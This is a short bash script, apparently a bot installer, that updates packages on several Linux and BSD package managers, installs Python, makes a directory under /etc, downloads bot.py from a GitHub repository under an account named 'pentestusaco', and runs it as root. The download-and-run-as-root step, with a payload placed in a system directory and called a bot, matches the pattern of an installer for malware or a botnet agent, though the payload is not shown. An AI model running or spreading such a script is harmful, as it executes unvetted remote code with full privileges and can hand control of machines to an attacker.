#!/bin/bash

sudo apt update -y
sudo yum update -y
sudo pkg update -y
sudo apt install -y python3 python
sudo yum install -y python3 python
sudo pkg install -y python3 python
cd /etc
mkdir -p bot
cd /etc/bot
wget https://raw.githubusercontent.com/pentestusaco/w/main/bot.py -O bot.py
sudo python3 bot.py
